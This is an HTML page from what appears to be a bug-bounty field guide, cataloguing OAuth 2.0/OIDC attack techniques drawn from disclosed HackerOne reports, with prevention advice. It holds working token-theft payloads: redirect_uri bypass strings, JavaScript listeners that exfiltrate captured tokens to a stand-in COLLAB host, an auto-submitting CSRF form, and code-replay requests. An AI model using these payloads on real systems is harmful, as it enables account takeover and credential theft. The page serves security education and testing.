@@ -1,0 +1,889 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>OAuth 2.0 / OIDC · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Attack surface</b><span class="sep">/</span><b>OAuth 2.0 / OIDC</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="on" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Attack surface</div>
+      <h1>OAuth 2.0 / OIDC</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>62</b></span><a class="chip lab" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>OAuth</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>OAuth 2.0 (and its identity layer, OIDC) is a <strong>delegation dance that happens in the URL bar</strong>: an <em>authorization server</em> (the IdP) hands a short-lived <code>code</code> or <code>access_token</code> to a pre-registered <code>redirect_uri</code>, and the <em>relying party</em> (the app) trades it for a logged-in session. Every value in that dance — <code>redirect_uri</code>, <code>response_type</code>, <code>state</code>, the <code>postMessage</code> relay that ferries the token back to the opener — is attacker-influenceable, and the payoff is always the victim's <code>code</code>/<code>token</code>.</p>
+<p>Because that credential <em>is</em> the victim's identity, almost every OAuth bug reduces to one of two moves: <strong>steal the credential in transit</strong> (redirect it, leak it via <code>Referer</code>, broadcast it over <code>postMessage</code>), or <strong>trick a stage into trusting a value it shouldn't</strong> (an unenforced <code>state</code>, an unverified email, an <code>access_token</code> minted for another app). Treat OAuth as an <strong>account-takeover primitive by default</strong>, not a "redirect" bug.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Capture a baseline grant.</strong> Proxy a real "Sign in with X" flow and record the authorize request — note which value carries the credential (<code>code</code> in query, <code>token</code> in fragment) and where it lands.</li><li><strong>Fuzz <code>redirect_uri</code></strong> through the full ladder below; watch where the <code>code</code>/<code>token</code> actually ends up. Anything you control = instant ATO.</li><li><strong>Probe <code>response_type</code>/<code>response_mode</code></strong> — flip <code>code</code>→<code>token</code>, or force <code>response_mode=fragment</code> when the client only wired <code>web_message</code>, to relocate the credential into a readable sink.</li><li><strong>Grep every relay/callback page's JS</strong> for <code>postMessage(x,'*')</code> and <code>postMessage(x, valueFromURL)</code> — the token often gets broadcast to any opener.</li><li><strong>Attack the endpoints directly</strong> — replay the authorize POST, add a <code>.json</code>/<code>.xml</code> suffix, drop <code>state</code>, replay a <code>code</code> twice at the token endpoint.</li><li><strong>Question what each stage trusts</strong> — is the IdP email verified? Is the <code>access_token</code>'s audience (app id) checked? Is the app auto-"trusted"?</li></ol>
+<div class="pre" data-lang="http"># Baseline — what does a normal grant look like? Note code-vs-token and the sink.
+GET /oauth/authorize?client_id=CLIENT&amp;response_type=code&amp;redirect_uri=https://legit/cb&amp;state=xyz&amp;scope=... HTTP/1.1
+Host: TARGET</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Fragments (<code>#token=...</code>) never reach the server but <em>do</em> survive cross-host redirects and sit in <code>window.name</code>/<code>Referer</code>. Query codes (<code>?code=...</code>) leak to any same-host analytics/reflected sink and into the <code>Referer</code> of the next navigation. Match your exfil channel to which one the flow uses.</div></div>
+<h2 class="sec" id="credential-theft-vectors"><span class="tick">§</span>Credential-theft vectors</h2>
+<p>Find which stage you can bend, then use the matching primitive.</p>
+<h3 class="sub" id="redirect-uri-validation-bypass">redirect_uri validation bypass</h3>
+<p>The single richest sink. Validation is almost always weaker than it looks — prefix match, wildcard subdomain, path traversal, or userinfo tricks. Run the ladder and watch where the credential lands.</p>
+<div class="pre" data-lang="http">redirect_uri=https://COLLAB/cb                 # fully arbitrary host?          (#665651)
+redirect_uri=https://legitCOLLAB.com/cb        # prefix match, no host boundary  (#405100)
+redirect_uri=https://legit.COLLAB.com/cb       # allowed prefix + '.' subdomain  (#405100)
+redirect_uri=https://COLLAB.legit.tld/cb       # attacker-registrable subdomain (#151058,#665651)
+redirect_uri=https://legit/cb/../../../evil    # path traversal, stays on host  (#1861974)
+redirect_uri=https://legit/cb%2f%2e%2e%2f      # encoded traversal
+redirect_uri=https://COLLAB@legit/cb           # userinfo @ trick               (#108113)
+redirect_uri=https://COLLAB%ff@legit/cb        # non-ASCII flips authority       (#108113)
+redirect_uri=/a/../../login?next=//COLLAB      # path-only + open redirect       (#110293)</div>
+<p>If any host you control is accepted, the grant delivers straight to you — implicit flow puts the token right in the fragment:</p>
+<div class="pre" data-lang="http">GET /oauth/authorize?client_id=CLIENT&amp;response_type=token&amp;redirect_uri=https%3A%2F%2FCOLLAB%2Fcb&amp;state=STATE HTTP/1.1
+Host: TARGET
+# victim authenticates -&gt; #access_token=... lands on COLLAB -&gt; ATO   (#665651)</div>
+<p>When only the <strong>host</strong> is allow-listed (traversal keeps you on it), land the <code>code</code> on a same-host page you can read and harvest it from analytics/referrer:</p>
+<div class="pre" data-lang="http">redirect_uri=https://booth.pm/users/auth/pixiv/callback/../../../../ja/items/ATTACKER_PRODUCT
+# code delivered to YOUR product page on the trusted host;
+# read it from Google Analytics real-time (referrer/query capture)   (#1861974)</div>
+<h3 class="sub" id="response-type-response-mode-manipulation">response_type / response_mode manipulation</h3>
+<p>The IdP often honours more response modes than the client wired up. Flip <code>code</code>→<code>token</code>, or force <code>response_mode=fragment</code>/<code>query</code> to reintroduce a URL sink the app doesn't expect — then read it with any same-origin script-exec or <code>window.name</code> leak.</p>
+<div class="pre" data-lang="http"># Client only handles web_message, but the IdP still honours fragment:
+GET /auth/authorize?client_id=CLIENT&amp;redirect_uri=https%3A%2F%2FTARGET&amp;response_type=code+id_token&amp;state=ATTACKER_STATE&amp;response_mode=fragment HTTP/1.1
+Host: appleid.apple.com
+# TARGET's main-window URL becomes #state&amp;code&amp;access_token -&gt; same-origin XSS/window.name reads it   (#1567186)</div>
+<div class="callout note"><span class="ico">● NOTE</span><div>Under <code>response_mode=web_message</code> the <strong>whole origin</strong> is trusted, so <code>redirect_uri</code> restrictions are irrelevant — the fix for one mode does not cover another. Enumerate every <code>response_type</code>/<code>response_mode</code> the IdP accepts, not just the one the app uses.</div></div>
+<h3 class="sub" id="postmessage-relay-bridge-pages">postMessage relay &amp; bridge pages</h3>
+<p>SSO flows shuttle the credential back through a helper page (<code>/auth/response.html</code>, <code>/oauth2/success</code>, <code>/bridge</code>). Grep its JS: if the message <strong>target origin</strong> or the <strong>frame type</strong> comes from the URL, or it's a flat <code>'*'</code>, the token is yours. <code>window.open</code> the flow and listen.</p>
+<div class="pre" data-lang="js">// Vulnerable success page runs: opener.postMessage({url: location.href /* ?code=.. */}, '*')
+var w = window.open('https://TARGET/oauth2/authorize?response_type=code&amp;client_id=CLIENT'
+  + '&amp;redirect_uri=https%3A%2F%2FTARGET%2Foauth2%2Fsuccess&amp;state=x');   // #314814
+window.addEventListener('message', e =&gt; navigator.sendBeacon('https://COLLAB', JSON.stringify(e.data)));</div>
+<p>When the relay derives its target/frame from the URL, point it at yourself directly. A <code>requestID</code> starting with <code>window_</code> selects the <code>opener</code> branch; <code>targetOrigin</code> is unvalidated:</p>
+<div class="pre" data-lang="http">redirect_uri=https://TARGET/auth/response.html?requestID=window_UUID&amp;baseUrl=/&amp;targetOrigin=https://COLLAB
+# used on: /oauth/authorize?response_type=token&amp;client_id=CLIENT&amp;redirect_uri=&lt;ENCODED_ABOVE&gt;&amp;prompt=none
+# page runs opener.postMessage(token, targetOrigin) -&gt; token to COLLAB   (#821896, #826394)</div>
+<p>Bridge pages may validate a <code>host</code> <strong>parameter</strong> but never the real <strong>embedding origin</strong> — just host the legit bridge URL on your page and catch the message:</p>
+<div class="pre" data-lang="html">&lt;iframe src="https://TARGET/bridge?consumer_key=KEY&amp;host=https://legit.app"&gt;&lt;/iframe&gt;
+&lt;script&gt;window.addEventListener('message', e =&gt; fetch('https://COLLAB/?c=' + encodeURIComponent(e.data)))&lt;/script&gt;
+&lt;!-- no interaction if the victim already authorized the app   (#110467) --&gt;</div>
+<h3 class="sub" id="csrf-on-the-authorize-endpoint-forced-grant-consent-skip">CSRF on the authorize endpoint (forced grant / consent skip)</h3>
+<p>If the authorize POST is CSRF-weak, auto-submit a form to mint a code for <strong>your</strong> app inside the victim's session — or replay it to skip a consent/email gate enforced only in the UI.</p>
+<div class="pre" data-lang="html">&lt;!-- .json/.xml suffix routes to a handler that skips the CSRF token   (#850022) --&gt;
+&lt;form action="https://TARGET/authorization.json" method="POST"&gt;
+  &lt;input name="client_id" value="ATTACKER_CLIENT_ID"&gt;
+  &lt;input name="type" value="web_server"&gt;
+  &lt;input name="redirect_uri" value="https://COLLAB/cb"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</div>
+<p>The gate ("validate your email", "grant consent") often lives only in the UI while the underlying POST is replayable — send it straight with the victim's cookies/CSRF/state:</p>
+<div class="pre" data-lang="http">POST /oauth/authorize HTTP/1.1
+Host: TARGET
+Content-Type: application/x-www-form-urlencoded
+Cookie: &lt;VICTIM_COOKIES&gt;
+
+authenticity_token=CSRF&amp;client_id=RP_CLIENT&amp;redirect_uri=https%3A%2F%2Frp%2Fcb&amp;state=STATE&amp;response_type=code&amp;scope=
+# skips the pre-grant email-verification wall -&gt; code issued   (#922456)</div>
+<h3 class="sub" id="token-endpoint-replay-broken-expiry">Token endpoint: replay &amp; broken expiry</h3>
+<p>Codes must be single-use and short-lived. Replay the same <code>code</code> twice; if both return <code>200</code>, single-use isn't enforced. Combined with an expiry check that reads the wrong lifetime column, a captured code stays valid for hours.</p>
+<div class="pre" data-lang="http"># exchange the captured code (form-encoded per RFC 6749):
+POST /login/oauth/token
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=authorization_code&amp;code=CAPTURED&amp;redirect_uri=...&amp;client_id=...   # -&gt; token A (200)
+# replay the identical request: if it 200s again, single-use isn't enforced
+grant_type=authorization_code&amp;code=CAPTURED&amp;redirect_uri=...&amp;client_id=...   # -&gt; token B (200) = replayable   (#3734676)
+
+# pivot: mint downstream creds in the victim identity
+GET /login/oauth/credentials
+Authorization: Bearer &lt;BRIDGE_TOKEN&gt;</div>
+<h3 class="sub" id="social-login-token-confusion-audience-not-verified">Social-login token confusion (audience not verified)</h3>
+<p>A native/social login backend that accepts a provider <code>access_token</code> <strong>must</strong> confirm the token was minted for <em>its own</em> app id. If it doesn't, mint a token with <em>any</em> app you own and log in as anyone.</p>
+<div class="pre" data-lang="http">POST /api/auth/facebook HTTP/1.1
+Host: TARGET
+Content-Type: application/json
+
+{"fb_token":"&lt;TOKEN_MINTED_FOR_ATTACKER_APP&gt;"}
+# server never calls /debug_token to check the audience -&gt; full ATO   (#314808, #101977)</div>
+<h3 class="sub" id="state-login-csrf-account-linking">state / login-CSRF &amp; account linking</h3>
+<p>A missing, static, or session-unbound <code>state</code> turns OAuth into CSRF: force-link the attacker's IdP identity onto the victim, or log the victim into the <em>attacker's</em> account (login CSRF). Start a flow, drop or reuse <code>state</code>, replay the callback in a fresh session.</p>
+<div class="pre" data-lang="http">GET /auth/gitlab/callback?code=ATTACKER_CODE&amp;state= HTTP/1.1   # state unenforced -&gt; links attacker identity to victim   (#104931, #55911, #46485, #225653)</div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Prefix / <code>startsWith</code> match</td><td><code>allowed.com</code> is a prefix of registrable <code>allowed.comEVIL.com</code></td><td>#405100</td></tr><tr><td>Wildcard subdomain</td><td>attacker-registrable <code>*.myshopify.com</code> shop as <code>return_to</code></td><td>#151058</td></tr><tr><td>Path-prefix host allowlist</td><td><code>/callback/../../../evil</code> traverses but stays on the allowed host</td><td>#1861974</td></tr><tr><td>Scheme-only callback check</td><td>path-only <code>a/../../login?...</code> + <code>*.twitter.com</code> open redirect</td><td>#110293</td></tr><tr><td>Host-only validation (userinfo)</td><td><code>https://COLLAB@registered.tld</code> passes hostname match</td><td>#108113</td></tr><tr><td>Parser vs serializer</td><td><code>COLLAB%ff@registered.tld</code>; <code>%ff</code>→<code>?</code> after validation flips the host</td><td>#108113</td></tr><tr><td>HPP first-validated/last-used</td><td>duplicate <code>host=legit&amp;host=attacker</code></td><td>#114169</td></tr><tr><td><code>;</code> param-delimiter differential</td><td>server splits on <code>;</code>, client only on <code>&amp;</code>: <code>host=legit;@attacker</code></td><td>#126522</td></tr><tr><td>IDN homograph</td><td>look-alike Unicode domain passes the host check</td><td>#861940</td></tr><tr><td>CSRF token on authorize</td><td><code>.json</code>/<code>.xml</code> suffix routes to a handler skipping <code>authenticity_token</code></td><td>#850022</td></tr><tr><td>UI-only consent/email gate</td><td>authorize POST is replayable past the wall</td><td>#922456</td></tr><tr><td>Consent screen (CSRF barrier)</td><td>HPP <code>trusted=0&amp;trusted=1</code> marks the app auto-authorized</td><td>#1148364</td></tr><tr><td>Origin-only <code>redirect_uri</code></td><td>attacker tail + subdomain open redirect → token in <code>Referer</code></td><td>#835437</td></tr><tr><td>Bridge <code>host</code> param check</td><td>real embedding origin never validated</td><td>#110467</td></tr><tr><td>Single-use / TTL on code</td><td>replay code twice; expiry reads credential lifetime not code TTL</td><td>#3734676</td></tr><tr><td>Provider token audience</td><td><code>access_token</code> from <em>any</em> app accepted (no app-id check)</td><td>#314808</td></tr><tr><td>Browser URL parsing</td><td>IE/Edge authority-parse quirk exfiltrates <code>access_token</code></td><td>#99435</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>A <code>redirect_uri</code> that only reflects the credential to a host <em>you already need to control</em> is not automatically a finding — you must show a <strong>realistically attacker-controllable</strong> origin: a registrable look-alike, a wildcard tenant subdomain you can register, or a same-host analytics/open-redirect sink. "It redirects to <code>evil.com</code> if I register <code>evil.com</code>" only counts when the check was supposed to stop exactly that.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>OAuth is a chaining hub — the stolen credential is the pivot, and a second small bug turns "loose validation" into full ATO:</p>
+<ul><li><strong>Origin-only <code>redirect_uri</code> + subdomain open redirect → token in <code>Referer</code></strong> (#835437, #131202, #202781): the origin regex passes, the path/query is yours, and the token leaks in the <code>Referer</code> of the next hop. See <a href="#">open-redirect</a>.</li><li><strong>response_mode switch + same-origin XSS/<code>window.name</code></strong> (#1567186): relocate the token into the fragment, then read it with any script-exec on the origin → account hijack. See <a href="#">xss</a>.</li><li><strong>HPP <code>trusted</code> flag → silent consent → CSRF authorize → mint victim token</strong> (#1148364) — a mass-assignment escalation on a privileged boolean.</li><li><strong>Unverified-IdP-email + email-keyed RP → cross-provider ATO</strong> (#922456, #314808, #101977): the relying party merges accounts by an email the IdP never verified; also opens internal apps gated on <code>@company.com</code>.</li><li><strong>Subdomain takeover of a whitelisted callback host → code theft</strong> (#665651 variant) — see <a href="#">subdomain-takeover</a>.</li><li><strong>No PKCE on mobile → code interception</strong> via a duplicate custom URL scheme a malicious app also registers (#1700734).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Exact-match <code>redirect_uri</code></strong> against a pre-registered full URI (scheme + host + path) — no prefix, wildcard, or traversal. Kills the entire <code>redirect_uri</code> family (#405100, #151058, #1861974, #665651).</li><li><strong>Enforce <code>state</code></strong> — high-entropy, single-use, session-bound — kills login/linking CSRF (#104931, #55911, #46485).</li><li><strong>Hardcode <code>targetOrigin</code></strong> on relay pages and validate the opener; never derive frame type or target from URL params (#821896, #826394, #314814, #110467).</li><li><strong>Single-use, short-TTL codes</strong> consumed atomically (<code>DELETE ... RETURNING WHERE expires&gt;now()</code>); the expiry check must read the code's own lifetime, not the credential's (#3734676, #1784162).</li><li><strong>Verify token audience</strong> — a social-login backend must confirm the <code>access_token</code> was minted for <em>its</em> app id (Facebook <code>/debug_token</code>) (#314808, #101977) — and require IdP email verification before asserting identity (#922456).</li><li><strong>Canonicalize before validating</strong>, and validate the exact bytes you serialize, to kill parser/serializer differentials, HPP, and non-ASCII authority tricks (#108113, #114169, #126522).</li><li><strong>PKCE</strong> on public/mobile clients defeats code interception via duplicate URL schemes (#1700734). Set <code>Referrer-Policy: no-referrer</code> on credential-bearing pages.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite</strong> — Repeater to fuzz <code>redirect_uri</code>/<code>state</code>, Intruder for the bypass ladder, <strong>Param Miner</strong> for HPP.</li><li><strong>Browser DevTools</strong> — breakpoints on <code>postMessage</code>/<code>addEventListener</code>, read relay-page JS for <code>targetOrigin</code> handling (#821896).</li><li><strong>collaborator / interactsh + a registered look-alike domain</strong> — exfil sinks for the redirected credential.</li><li><strong>Google Analytics real-time</strong> — an unwitting same-host <code>code</code> sink when traversal keeps you on the trusted host (#1861974).</li><li><strong>jadx / apktool</strong> — extract embedded <code>consumer_key</code>/<code>secret</code> and deep-link schemes from mobile apps (#110293, #1700734).</li><li><strong>Facebook <code>/debug_token</code></strong> — confirm whether a provider token's <code>app_id</code> audience is actually being checked.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>62</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-1567186" style="--sv:var(--sev-crit)" data-sev="4" data-votes="506" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth code/token theft via response_mode switch + sandbox XSS postMessage</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1567186</b> · reddit · awarded · 506 votes · resolved</div>
+<div class="taxo"><span>Program <b>reddit</b></span><span>Surface <b>web</b></span><span>Chain <b>response_mode switch -&gt; token in reddit.com fragment -&gt</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Reddit's Sign-in-with-Apple uses response_mode=web_message live, but Apple still honors response_type=code+id_token &amp; response_mode=fragment. Reddit doesn't expect tokens in the URL fragment, and www.redditmedia.com passes the parent window's full URL (incl. fragment) via window.name, letting a same-origin XSS read it.</p>
+<h4>Method</h4><ol><li>Attacker pre-generates a state param from the real Apple flow (to bind the victim's code to attacker)</li><li>Victim page frames www.redditmedia.com sandbox which builds an Apple authorize link with response_type=code+id_token &amp; response_mode=fragment and the attacker state</li><li>Victim completes Apple login; reddit.com main window URL becomes #state&amp;code&amp;access_token</li><li>XSS on redditmedia (same origin as the iframe) reads window.name/current URL and exfiltrates the code</li><li>Attacker replays code via opener.postMessage to sign in as victim</li></ol>
+<div class="pre">https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&amp;redirect_uri=https%3A%2F%2Fwww.reddit.com&amp;response_type=code+id_token&amp;state=&lt;ATTACKER_STATE&gt;&amp;scope=&amp;response_mode=fragment</div>
+<p class="insight"><b>Insight —</b> When an IdP supports multiple response_modes and the client only wired up web_message, force response_mode=fragment/query to land the token somewhere the client will happily postMessage or leak. Combine with any same-origin script-exec (or a window.name-leaking sandbox) to read the fragment.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1567186" target="_blank" rel="noopener">hackerone.com/reports/1567186</a></span><a class="src" href="#report-1567186" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-384289" style="--sv:var(--sev-crit)" data-sev="4" data-votes="14" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OIDC redirect_uri prefix-match validation bypass</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#384289</b> · gsa_bbp · none · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>gsa_bbp</b></span><span>Surface <b>web</b></span><span>Chain <b>redirect_uri bypass -&gt; steal OIDC code/token -&gt; accoun</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The /openid_connect/authorize endpoint validated redirect_uri by matching the beginning of the hostname rather than exact host, so a hostname starting with the allowed host but continuing into an attacker domain (agency.gov.example.com) passed as agency.gov, redirecting the auth code/token to the attacker.</p>
+<h4>Method</h4><ol><li>Observe an SP whose allowed redirect host is agency.gov</li><li>Craft redirect_uri with host agency.gov.&lt;attacker&gt;.com (starts with allowed hostname)</li><li>Send the victim through the authorize flow with this redirect_uri</li><li>Loose prefix validation accepts it; the OIDC token/code is delivered to attacker host -&gt; session compromise</li></ol>
